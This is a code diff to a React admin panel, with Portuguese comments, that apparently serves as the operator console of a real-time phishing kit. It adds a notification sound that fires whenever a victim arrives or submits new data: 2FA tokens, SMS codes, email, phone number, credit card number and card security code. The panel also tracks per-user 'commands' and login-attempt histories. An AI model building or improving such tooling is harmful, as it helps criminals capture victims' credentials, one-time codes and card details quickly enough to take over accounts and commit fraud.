@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import axios from "axios";
 import jsPDF from "jspdf";
 
@@ -31,6 +31,60 @@ function AdminPanel() {
   const [refModal, setRefModal] = useState(null); // { userId, command, label, placeholder }
   const [refModalValue, setRefModalValue] = useState("");
   const [historyModal, setHistoryModal] = useState(null); // attempt object
+
+  // Notificação sonora
+  const audioRef = useRef(null);
+  const prevDataRef = useRef(null);
+
+  const playNotification = useCallback(() => {
+    try {
+      if (!audioRef.current) {
+        audioRef.current = new Audio("/notification.mp3");
+      }
+      audioRef.current.currentTime = 0;
+      audioRef.current.play().catch(() => {});
+    } catch (e) {}
+  }, []);
+
+  // Detectar novos dados ao atualizar loginAttempts
+  useEffect(() => {
+    if (!prevDataRef.current || !isAuthenticated) {
+      prevDataRef.current = loginAttempts;
+      return;
+    }
+
+    const prev = prevDataRef.current;
+    const curr = loginAttempts;
+
+    // Novo usuário chegou
+    if (curr.length > prev.length) {
+      playNotification();
+      prevDataRef.current = curr;
+      return;
+    }
+
+    // Verificar se algum dado mudou (novo dado enviado pelo usuário)
+    const dataFields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cc_code"];
+    for (const attempt of curr) {
+      const prevAttempt = prev.find(p => p.id === attempt.id);
+      if (!prevAttempt) { playNotification(); break; }
+      for (const field of dataFields) {
+        if (attempt[field] && attempt[field] !== prevAttempt[field]) {
+          playNotification();
+          prevDataRef.current = curr;
+          return;
+        }
+      }
+      // Verificar tentativas adicionais de login
+      if ((attempt.attempts?.length || 0) > (prevAttempt.attempts?.length || 0)) {
+        playNotification();
+        prevDataRef.current = curr;
+        return;
+      }
+    }
+
+    prevDataRef.current = curr;
+  }, [loginAttempts, isAuthenticated, playNotification]);
 
   // Função para copiar texto com um clique
   const copyToClipboard = async (text, fieldId) => {
